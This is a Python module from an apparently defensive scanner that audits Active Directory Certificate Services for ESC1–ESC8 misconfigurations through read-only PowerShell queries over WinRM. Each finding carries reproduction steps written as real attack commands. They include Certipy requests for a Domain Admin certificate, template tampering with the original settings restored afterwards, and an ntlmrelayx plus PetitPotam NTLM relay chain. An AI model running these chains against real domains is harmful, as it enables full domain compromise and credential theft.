"""Windows Active Directory Certificate Services (ADCS) Audit — credentialed WinRM check.

Detects ESC1-ESC8 and CA hardening issues exploitable for certificate-based privilege
escalation and domain persistence.

Nessus equivalent: Plugin 193267 (AD CS Certificate Template Privilege Escalation).
"""
from __future__ import annotations

import csv
import io
import re
import sys
import time
from pathlib import Path

sys.path.insert(0, str(Path(__file__).parent.parent.parent.parent))

from common.base_module import BaseModule, ModuleResult
from common.evidence import Evidence
from common.finding import Severity

# CVSS vectors — all ADCS ESC issues allow full domain compromise from low-priv user
CVSS_CRIT = "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H"
CVSS_HIGH  = "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N"
CVSS_MED   = "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:H/I:N/A:N"

# ESC1: Enrollee supplies SAN (msPKI-Certificate-Name-Flag bit 1 = CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT)
_PS_GET_DOMAIN_DN = (
    "(Get-ADRootDSE).defaultNamingContext"
)

_PS_LIST_CAS = (
    "Get-ADObject -SearchBase \"CN=Enrollment Services,CN=Public Key Services,"
    "CN=Services,CN=Configuration,$((Get-ADRootDSE).configurationNamingContext)\" "
    "-Filter * -Properties dNSHostName,cACertificate | "
    "Select-Object Name,dNSHostName | ConvertTo-Csv -NoTypeInformation"
)

_PS_ESC1 = (
    "$cfg = (Get-ADRootDSE).configurationNamingContext; "
    "Get-ADObject -LDAPFilter '(objectClass=pKICertificateTemplate)' "
    "-SearchBase \"CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,$cfg\" "
    "-Properties Name,msPKI-Certificate-Name-Flag,msPKI-Enrollment-Flag,"
    "pkiextendedkeyusage,'msPKI-RA-Signature','nTSecurityDescriptor' | "
    "Where-Object { "
    "($_.\"msPKI-Certificate-Name-Flag\" -band 1) -and "
    "($_.pkiextendedkeyusage -contains '1.3.6.1.5.5.7.3.2') "
    "} | Select-Object Name,'msPKI-Certificate-Name-Flag',pkiextendedkeyusage | "
    "ConvertTo-Csv -NoTypeInformation"
)

_PS_ESC2 = (
    "$cfg = (Get-ADRootDSE).configurationNamingContext; "
    "Get-ADObject -LDAPFilter '(objectClass=pKICertificateTemplate)' "
    "-SearchBase \"CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,$cfg\" "
    "-Properties Name,pkiextendedkeyusage,'msPKI-Certificate-Name-Flag' | "
    "Where-Object { "
    "$_.pkiextendedkeyusage -contains '2.5.29.37.0' -or "
    "$_.pkiextendedkeyusage -contains '1.3.6.1.4.1.311.20.2.2' -or "
    "-not $_.pkiextendedkeyusage "
    "} | Select-Object Name,pkiextendedkeyusage | ConvertTo-Csv -NoTypeInformation"
)

_PS_ESC4 = (
    "$cfg = (Get-ADRootDSE).configurationNamingContext; "
    "$templates = Get-ADObject -LDAPFilter '(objectClass=pKICertificateTemplate)' "
    "-SearchBase \"CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,$cfg\" "
    "-Properties Name; "
    "foreach ($t in $templates) { "
    "try { "
    "$acl = Get-Acl -Path \"AD:$($t.DistinguishedName)\" -ErrorAction Stop; "
    "$risky = $acl.Access | Where-Object { "
    "($_.IdentityReference -match 'Domain Users|Authenticated Users|Everyone') -and "
    "($_.ActiveDirectoryRights -match 'Write|GenericAll|GenericWrite|FullControl') -and "
    "$_.AccessControlType -eq 'Allow' "
    "}; "
    "if ($risky) { "
    "$risky | ForEach-Object { "
    "[PSCustomObject]@{ Template=$t.Name; Identity=$_.IdentityReference; Rights=$_.ActiveDirectoryRights } } "
    "} "
    "} catch {} "
    "} | ConvertTo-Csv -NoTypeInformation"
)

_PS_ESC6 = (
    # Uses local certutil -config to query CA registry via RPC instead of
    # Invoke-Command, avoiding the Kerberos double-hop problem with WinRM.
    # certutil -config "host\CAName" makes a direct RPC call — no delegation needed.
    "$caObjs = Get-ADObject -SearchBase \"CN=Enrollment Services,CN=Public Key Services,"
    "CN=Services,CN=Configuration,$((Get-ADRootDSE).configurationNamingContext)\" "
    "-Filter * -Properties dNSHostName,Name; "
    "foreach ($ca in $caObjs) { "
    "try { "
    "$cfg = $ca.dNSHostName + '\\' + $ca.Name; "
    "$out = certutil -config $cfg -getreg policy\\EditFlags 2>&1; "
    "[PSCustomObject]@{ "
    "CA = $ca.Name; "
    "Output = ($out -join ' ') "
    "} "
    "} catch { "
    "[PSCustomObject]@{ CA=$ca.Name; Output='ERROR: ' + $_.Exception.Message } "
    "} } | ConvertTo-Csv -NoTypeInformation"
)

# ESC8: Check if HTTP certsrv is responding (web enrollment enabled on HTTP)
_PS_ESC8 = (
    "$cas = Get-ADObject -SearchBase \"CN=Enrollment Services,CN=Public Key Services,"
    "CN=Services,CN=Configuration,$((Get-ADRootDSE).configurationNamingContext)\" "
    "-Filter * -Properties dNSHostName | Select-Object -ExpandProperty dNSHostName; "
    "foreach ($ca in $cas) { "
    "try { "
    "$r80  = (Test-NetConnection -ComputerName $ca -Port 80  -WarningAction SilentlyContinue).TcpTestSucceeded; "
    "$r443 = (Test-NetConnection -ComputerName $ca -Port 443 -WarningAction SilentlyContinue).TcpTestSucceeded; "
    "[PSCustomObject]@{ CA=$ca; Port80=$r80; Port443=$r443 } "
    "} catch { [PSCustomObject]@{ CA=$ca; Port80='error'; Port443='error' } } "
    "} | ConvertTo-Csv -NoTypeInformation"
)

# Weak crypto: CA accepting SHA1 or RSA key < 2048
_PS_WEAK_CRYPTO = (
    "$cfg = (Get-ADRootDSE).configurationNamingContext; "
    "Get-ADObject -LDAPFilter '(objectClass=pKICertificateTemplate)' "
    "-SearchBase \"CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,$cfg\" "
    "-Properties Name,msPKI-Minimal-Key-Size,msPKI-Private-Key-Flag | "
    "Where-Object { $_.'msPKI-Minimal-Key-Size' -and [int]$_.'msPKI-Minimal-Key-Size' -lt 2048 } | "
    "Select-Object Name,'msPKI-Minimal-Key-Size' | ConvertTo-Csv -NoTypeInformation"
)


def _parse_csv_rows(output: str | None) -> list[dict[str, str]]:
    """Parse PowerShell ConvertTo-Csv -NoTypeInformation output into list of dicts.

    Uses Python's csv module for correct handling of quoted fields, embedded
    commas, and escaped quotes — critical in enterprise AD environments where
    DistinguishedNames, descriptions, and group memberships contain commas.
    """
    text = (output or "").strip()
    if not text:
        return []
    # Strip the #TYPE line that ConvertTo-Csv sometimes emits
    lines = text.splitlines()
    if lines and lines[0].startswith("#TYPE"):
        text = "\n".join(lines[1:]).strip()
    if not text:
        return []
    try:
        reader = csv.DictReader(io.StringIO(text), restval="")
        return [dict(row) for row in reader]
    except (csv.Error, StopIteration, KeyError):
        return []


class WinAdcsAudit(BaseModule):
    NAME        = "win_adcs_audit"
    DESCRIPTION = "WinRM credentialed: ADCS ESC1-ESC8 certificate misconfiguration audit"
    PHASE       = 5
    TAGS        = ["credentialed", "windows", "adcs", "pki", "esc"]

    async def run(self) -> ModuleResult:
        start = time.monotonic()
        transport_mgr = self.config.extra.get("transport_manager")
        if not transport_mgr or not transport_mgr.has_creds("winrm"):
            return self._make_result(start, skipped=True, skip_reason="no WinRM credentials")

        hosts = self.config.extra.get("live_hosts", [self.config.target])
        # ADCS audit is domain-wide — pick one DC / domain-joined host to query AD
        for host in hosts[:10]:
            if not self.check_scope(host):
                continue
            await self.rate_limit()
            session = await transport_mgr.get_winrm_session(host)
            if not session:
                continue

            winrm = transport_mgr.winrm

            # Verify RSAT/AD PowerShell available and host is domain-joined
            check = await winrm.execute(session, "Get-ADRootDSE | Select-Object -ExpandProperty defaultNamingContext")
            if not check.success or not check.stdout.strip():
                continue

            # Run all ADCS checks against this host (represents the domain)
            await self._check_esc1(host, winrm, session)
            await self._check_esc2(host, winrm, session)
            await self._check_esc4(host, winrm, session)
            await self._check_esc6(host, winrm, session)
            await self._check_esc8(host, winrm, session)
            await self._check_weak_crypto(host, winrm, session)
            # Only need to enumerate domain once
            break

        return self._make_result(start)

    # ── ESC1 ────────────────────────────────────────────────────────────────

    async def _check_esc1(self, host: str, winrm, session) -> None:
        """ESC1: Certificate template allows enrollee-supplied SAN with Client Auth EKU."""
        result = await winrm.execute(session, _PS_ESC1)
        if not result.success:
            return

        rows = _parse_csv_rows(result.stdout)
        if not rows:
            return

        template_names = [r.get("Name", "unknown") for r in rows]

        self.new_finding(
            title=f"ADCS ESC1: Enrollee-Supplied SAN Enabled on {len(rows)} Template(s) — {host}",
            severity=Severity.CRITICAL,
            description=(
                f"{len(rows)} certificate template(s) have CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT set "
                f"(msPKI-Certificate-Name-Flag bit 0x1) with Client Authentication EKU "
                f"(1.3.6.1.5.5.7.3.2). Any low-privileged user who can enroll in these templates "
                f"can request a certificate with an arbitrary SAN — including a Domain Admin UPN — "
                f"and use it to authenticate as that account via PKINIT or Schannel.\n\n"
                f"NOTE: This finding confirms the flag and EKU are set. Exploitability also requires "
                f"(a) the template is published to at least one Enrollment Service CA, and "
                f"(b) the enrolling account has Enroll or AutoEnroll rights on the template. "
                f"Verify with: certipy find -vulnerable -stdout to confirm end-to-end ESC1 exploitability. "
                f"If enrollment rights are restricted to specific service accounts only, severity may be lower.\n\n"
                f"Vulnerable templates ({len(rows)}): {', '.join(template_names)}"
            ),
            reproduction_steps=[
                f"# On attacker workstation — using Certipy (https://github.com/ly4k/Certipy)",
                f"certipy find -u lowpriv@domain.local -p Password1 -dc-ip {host} -vulnerable -stdout",
                f"# Identify ESC1 template (e.g., VulnTemplate), then request cert as DA:",
                f"certipy req -u lowpriv@domain.local -p Password1 -ca 'CA-NAME' "
                f"-template VulnTemplate -upn administrator@domain.local -dc-ip {host}",
                f"# Authenticate with obtained certificate:",
                f"certipy auth -pfx administrator.pfx -domain domain.local -dc-ip {host}",
            ],
            remediation=(
                "1. Remove CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT from vulnerable templates: "
                "Open Certificate Templates Console → Template Properties → Subject Name tab → "
                "uncheck 'Supply in the request'. "
                "2. If SAN supply is required, enable CA Manager Approval (msPKI-Enrollment-Flag bit 0x2). "
                "3. Restrict enrollment permissions to specific service accounts only. "
                "4. Enable 'Require RA signature' if template must remain flexible."
            ),
            references=[
                "https://posts.specterops.io/certified-pre-owned-d95910965cd2",
                "CVE-2022-26923",
                "https://github.com/ly4k/Certipy",
                "https://attack.mitre.org/techniques/T1649/",
            ],
            evidence=Evidence(extra={
                "host": host,
                "esc": "ESC1",
                "vulnerable_templates": rows[:20],
                "technique": "CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT + Client Auth EKU",
            }),
            cvss_v31_vector=CVSS_CRIT,
            mitre_attack=["TA0006/T1649", "TA0004/T1078.002"],
            target=host, service="winrm", confidence="HIGH",
        )

    # ── ESC2 ────────────────────────────────────────────────────────────────

    async def _check_esc2(self, host: str, winrm, session) -> None:
        """ESC2: Template allows Any Purpose or SubCA EKU."""
        result = await winrm.execute(session, _PS_ESC2)
        if not result.success:
            return

        rows = _parse_csv_rows(result.stdout)
        if not rows:
            return

        template_names = [r.get("Name", "unknown") for r in rows]

        self.new_finding(
            title=f"ADCS ESC2: Any-Purpose/SubCA EKU on {len(rows)} Template(s) — {host}",
            severity=Severity.CRITICAL,
            description=(
                f"{len(rows)} certificate template(s) allow Any Purpose EKU "
                f"(OID 2.5.29.37.0) or SubCA (1.3.6.1.4.1.311.20.2.2), or have no EKU restriction. "
                f"These templates can issue certificates usable for any purpose, including code signing, "
                f"smart card logon, and client authentication — functionally equivalent to a subordinate CA. "
                f"An enrollee can forge certificates for any principal in the domain.\n\n"
                f"NOTE: Exploitability requires the template to be published to an Enrollment Service CA "
                f"and the attacker account to hold Enroll rights. Verify with certipy find -vulnerable "
                f"to confirm end-to-end exploitability before reporting as confirmed-exploitable.\n\n"
                f"Vulnerable templates ({len(rows)}): {', '.join(template_names)}"
            ),
            reproduction_steps=[
                f"certipy find -u lowpriv@domain.local -p Password1 -dc-ip {host} -vulnerable -stdout",
                "# ESC2 templates appear under 'Any Purpose' in Certipy output",
                f"certipy req -u lowpriv@domain.local -p Password1 -ca 'CA-NAME' -template <template>",
                "# Use certificate to perform further attacks (smart card logon, coerce auth, etc.)",
            ],
            remediation=(
                "1. Remove Any Purpose EKU from templates — replace with specific EKUs required. "
                "2. Delete SubCA templates if not in active use. "
                "3. Enable CA Manager Approval on any template with broad EKU coverage. "
                "4. Audit enrollment permissions quarterly."
            ),
            references=[
                "https://posts.specterops.io/certified-pre-owned-d95910965cd2",
                "https://github.com/ly4k/Certipy",
                "https://attack.mitre.org/techniques/T1649/",
            ],
            evidence=Evidence(extra={
                "host": host,
                "esc": "ESC2",
                "vulnerable_templates": rows[:20],
            }),
            cvss_v31_vector=CVSS_CRIT,
            mitre_attack=["TA0006/T1649"],
            target=host, service="winrm", confidence="HIGH",
        )

    # ── ESC4 ────────────────────────────────────────────────────────────────

    async def _check_esc4(self, host: str, winrm, session) -> None:
        """ESC4: Overpermissioned template ACL — Domain Users can write template properties."""
        result = await winrm.execute(session, _PS_ESC4)
        if not result.success:
            return

        rows = _parse_csv_rows(result.stdout)
        if not rows:
            return

        by_template: dict[str, list[dict]] = {}
        for row in rows:
            t = row.get("Template", "unknown")
            by_template.setdefault(t, []).append(row)

        template_list = list(by_template.keys())

        self.new_finding(
            title=f"ADCS ESC4: Overpermissioned Template ACL on {len(by_template)} Template(s) — {host}",
            severity=Severity.CRITICAL,
            description=(
                f"{len(by_template)} certificate template(s) grant WriteProperty, GenericWrite, "
                f"GenericAll, or FullControl to Domain Users, Authenticated Users, or Everyone. "
                f"An attacker can modify a template's EKU, SAN flags, or enrollment permissions "
                f"to create an ESC1/ESC2 condition on demand, then restore the original settings "
                f"to hide evidence.\n\n"
                f"Vulnerable templates: {', '.join(template_list)}"
            ),
            reproduction_steps=[
                f"# Identify writable template ACL:",
                f"certipy find -u lowpriv@domain.local -p Password1 -dc-ip {host} -vulnerable -stdout",
                "# Modify template to enable ESC1:",
                "certipy template -u lowpriv@domain.local -p Password1 -template <VulnTemplate> -save-old",
                "# Request cert as DA:",
                "certipy req -u lowpriv@domain.local -p Password1 -ca 'CA-NAME' "
                "-template <VulnTemplate> -upn administrator@domain.local",
                "# Restore original template config:",
                "certipy template -u lowpriv@domain.local -p Password1 -template <VulnTemplate> -restore",
            ],
            remediation=(
                "1. Remove Write/GenericAll/FullControl ACEs for Domain Users, Authenticated Users, "
                "and Everyone from all certificate templates. "
                "2. Restrict Write access to PKI Admins only. "
                "3. Enable Protected Users security group for CA admin accounts. "
                "4. Run 'certutil -catemplates' audit monthly."
            ),
            references=[
                "https://posts.specterops.io/certified-pre-owned-d95910965cd2",
                "https://github.com/ly4k/Certipy",
                "https://attack.mitre.org/techniques/T1649/",
            ],
            evidence=Evidence(extra={
                "host": host,
                "esc": "ESC4",
                "vulnerable_templates": rows[:40],
                "template_names": template_list[:20],
            }),
            cvss_v31_vector=CVSS_CRIT,
            mitre_attack=["TA0006/T1649", "TA0005/T1222.001"],
            target=host, service="winrm", confidence="HIGH",
        )

    # ── ESC6 ────────────────────────────────────────────────────────────────

    async def _check_esc6(self, host: str, winrm, session) -> None:
        """ESC6: CA has EDITF_ATTRIBUTESUBJECTALTNAME2 flag (0x00040000) set."""
        result = await winrm.execute(session, _PS_ESC6)
        if not result.success:
            return

        rows = _parse_csv_rows(result.stdout)
        vulnerable_cas: list[str] = []

        for row in rows:
            output = row.get("Output", "")
            ca_name = row.get("CA", "unknown")
            if "ACCESS_DENIED" in output or output.startswith("ERROR:"):
                continue
            # certutil -getreg policy\EditFlags output format varies by Windows version:
            # Server 2012/2016: "EditFlags REG_DWORD = 0x00040000 (262144)"
            # Server 2019/2022: "EDITF_ATTRIBUTESUBJECTALTNAME2 -- 40000 (262144)" or similar
            # We try multiple patterns to be robust.

            # Pattern 1: hex value in parentheses or after equals sign
            # Matches: "EditFlags REG_DWORD = 0x11014e (1118542)"
            #           "EditFlags = 0x00040000"
            m = re.search(
                r'EditFlags\s+(?:REG_DWORD\s+)?[=:]\s*(0x[0-9a-fA-F]+)',
                output, re.IGNORECASE
            )
            if not m:
                # Pattern 2: decimal value in parentheses after REG_DWORD line
                m2 = re.search(r'EditFlags[^\n]*\(([\d]+)\)', output, re.IGNORECASE)
                if m2:
                    try:
                        flags = int(m2.group(1))
                        if flags & 0x00040000:
                            vulnerable_cas.append(ca_name)
                    except ValueError:
                        pass
                    continue

            if m:
                try:
                    flags = int(m.group(1), 0)
                    if flags & 0x00040000:
                        vulnerable_cas.append(ca_name)
                except ValueError:
                    pass
                continue

            # Pattern 3: flag name appears verbatim in verbose certutil output
            if "EDITF_ATTRIBUTESUBJECTALTNAME2" in output:
                # Ensure it's listed as enabled, not just mentioned in documentation output.
                # certutil verbose output shows "EDITF_ATTRIBUTESUBJECTALTNAME2 -- 40000 (262144)"
                # only when the flag is SET. A disabled flag would not appear in the enabled list.
                vulnerable_cas.append(ca_name)

        if not vulnerable_cas:
            return

        self.new_finding(
            title=f"ADCS ESC6: EDITF_ATTRIBUTESUBJECTALTNAME2 Set on CA — {host}",
            severity=Severity.CRITICAL,
            description=(
                f"The CA flag EDITF_ATTRIBUTESUBJECTALTNAME2 (0x00040000) is set on "
                f"{len(vulnerable_cas)} Certificate Authorit(ies): {', '.join(vulnerable_cas)}. "
                f"This flag allows requesters to specify a SAN in ANY certificate request, "
                f"regardless of template configuration. Combined with any enrollment-permitted template, "
                f"a low-privileged user can obtain a certificate for an arbitrary UPN (e.g., Administrator) "
                f"and authenticate as that user."
            ),
            reproduction_steps=[
                f"# Verify flag via certutil on CA host:",
                f"certutil -getreg policy\\EditFlags",
                f"# Request cert with arbitrary SAN using any enrollable template:",
                f"certipy req -u lowpriv@domain.local -p Password1 -ca '{vulnerable_cas[0]}' "
                f"-template User -upn administrator@domain.local -dc-ip {host}",
                f"certipy auth -pfx administrator.pfx -domain domain.local -dc-ip {host}",
            ],
            remediation=(
                "1. Disable the flag on all CAs: "
                "certutil -setreg policy\\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2 "
                "(run on each CA server, then restart CertSvc). "
                "2. After disabling, restart the CA service: net stop certsvc && net start certsvc. "
                "3. Audit existing issued certificates for unauthorized SANs."
            ),
            references=[
                "https://posts.specterops.io/certified-pre-owned-d95910965cd2",
                "CVE-2022-26923",
                "https://github.com/ly4k/Certipy",
            ],
            evidence=Evidence(extra={
                "host": host,
                "esc": "ESC6",
                "vulnerable_cas": vulnerable_cas,
                "flag_hex": "0x00040000",
                "flag_name": "EDITF_ATTRIBUTESUBJECTALTNAME2",
            }),
            cvss_v31_vector=CVSS_CRIT,
            mitre_attack=["TA0006/T1649"],
            target=host, service="winrm", confidence="HIGH",
        )

    # ── ESC8 ────────────────────────────────────────────────────────────────

    async def _check_esc8(self, host: str, winrm, session) -> None:
        """ESC8: AD CS web enrollment (certsrv) accessible over HTTP — NTLM relay target."""
        result = await winrm.execute(session, _PS_ESC8)
        if not result.success:
            return

        rows = _parse_csv_rows(result.stdout)
        http_cas: list[str] = []

        for row in rows:
            ca = row.get("CA", "unknown")
            port80 = row.get("Port80", "False")
            if str(port80).strip().lower() in ("true", "1"):
                http_cas.append(ca)

        if not http_cas:
            return

        self.new_finding(
            title=f"ADCS ESC8: Web Enrollment HTTP Open on {len(http_cas)} CA(s) — {host}",
            severity=Severity.CRITICAL,
            description=(
                f"The AD CS Web Enrollment interface (http://<CA>/certsrv/) is accessible over "
                f"plain HTTP on {len(http_cas)} CA server(s): {', '.join(http_cas)}. "
                f"HTTP-based NTLM authentication can be relayed using ntlmrelayx to obtain "
                f"a certificate for any incoming NTLM authentication (e.g., coerced from a DC "
                f"via PetitPotam or PrinterBug). This enables domain compromise without any "
                f"valid credentials."
            ),
            reproduction_steps=[
                "# Step 1: Start ntlmrelayx targeting the CA web enrollment:",
                f"ntlmrelayx.py -t http://{http_cas[0]}/certsrv/certfnsh.asp -smb2support --adcs --template DomainController",
                "# Step 2: Coerce DC authentication:",
                f"python3 PetitPotam.py -u '' -p '' <attacker-ip> {host}",
                "# Step 3: Obtain base64 certificate from ntlmrelayx output",
                "# Step 4: Authenticate with certificate:",
                "certipy auth -pfx dc01.pfx -domain domain.local",
            ],
            remediation=(
                "1. Enforce HTTPS on all AD CS web enrollment interfaces — disable HTTP port 80. "
                "2. Enable Extended Protection for Authentication (EPA) on IIS hosting certsrv. "
                "3. Require HTTPS with mutual TLS for enrollment. "
                "4. Block PetitPotam-style coercions: filter MS-EFSR and MS-RPRN at the firewall. "
                "5. Consider disabling web enrollment if HTTPS-based DCOM enrollment is sufficient."
            ),
            references=[
                "https://posts.specterops.io/certified-pre-owned-d95910965cd2",
                "CVE-2021-36942",
                "https://github.com/topotam/PetitPotam",
                "https://attack.mitre.org/techniques/T1649/",
            ],
            evidence=Evidence(extra={
                "host": host,
                "esc": "ESC8",
                "http_enrollment_cas": http_cas,
                "attack": "NTLM relay to certsrv via PetitPotam/PrinterBug coercion",
            }),
            cvss_v31_vector=CVSS_CRIT,
            mitre_attack=["TA0006/T1649", "TA0008/T1557.001"],
            target=host, service="winrm", confidence="HIGH",
        )

    # ── Weak crypto ─────────────────────────────────────────────────────────

    async def _check_weak_crypto(self, host: str, winrm, session) -> None:
        """Detect templates allowing RSA key length < 2048 bits."""
        result = await winrm.execute(session, _PS_WEAK_CRYPTO)
        if not result.success:
            return

        rows = _parse_csv_rows(result.stdout)
        if not rows:
            return

        weak_templates = [
            {"name": r.get("Name", "unknown"), "min_key": r.get("msPKI-Minimal-Key-Size", "unknown")}
            for r in rows
        ]

        self.new_finding(
            title=f"ADCS Weak Key Length (<2048-bit RSA) on {len(weak_templates)} Template(s) — {host}",
            severity=Severity.HIGH,
            description=(
                f"{len(weak_templates)} certificate template(s) allow RSA keys shorter than 2048 bits. "
                f"Sub-2048-bit RSA keys are considered weak by NIST SP 800-131A and are vulnerable "
                f"to factorization attacks. Certificates issued with these keys can be forged. "
                f"Templates: "
                + ", ".join(f"{t['name']} ({t['min_key']}bit)" for t in weak_templates[:10])
            ),
            reproduction_steps=[
                "$cfg = (Get-ADRootDSE).configurationNamingContext",
                "Get-ADObject -LDAPFilter '(objectClass=pKICertificateTemplate)' "
                "-SearchBase \"CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,$cfg\" "
                "-Properties Name,'msPKI-Minimal-Key-Size' | "
                "Where-Object { [int]$_.'msPKI-Minimal-Key-Size' -lt 2048 }",
            ],
            remediation=(
                "1. Set minimum key length to 2048 bits (or 4096 for high-assurance templates). "
                "2. Open each template in Certificate Templates Console → Request Handling tab → "
                "set Minimum key size to 2048. "
                "3. Revoke and re-issue any existing certificates using weak keys."
            ),
            references=[
                "NIST SP 800-131A Rev 2",
                "https://learn.microsoft.com/en-us/windows-server/security/certificates-and-public-key-infrastructure-adcs",
            ],
            evidence=Evidence(extra={
                "host": host,
                "weak_templates": weak_templates[:20],
            }),
            cvss_v31_vector=CVSS_HIGH,
            mitre_attack=["TA0006/T1649"],
            target=host, service="winrm", confidence="HIGH",
        )
